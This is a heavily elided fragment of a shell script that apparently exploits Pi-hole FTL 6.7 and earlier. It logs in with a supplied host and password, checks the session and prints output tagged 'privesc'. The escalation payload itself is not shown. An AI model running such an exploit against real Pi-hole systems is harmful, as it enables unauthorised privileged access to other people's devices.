...
# works on FTL <= 6.7
#
# set env var PIHOST= and PIPASS= to your target pihole hostname and password or edit below
#
...
if [ "${PIPASS}x" != "x" ]; then
  ...
  if [ "${SID}" == "null" ];then
    echo "[-] reached target, but got session.sid = null, is password correct?"
    exit 1
  fi
  if [ "${SID}x" == "x" ];then
    echo "[-] cant create session with ${PIHOST} - is host up?"
    exit 1
  fi
...
#echo ""
#echo "[*] privesc output:"
echo "${reslog}" | grep -ve INFO | grep -ve ERROR | sed 's/^/  [privesc] /g'
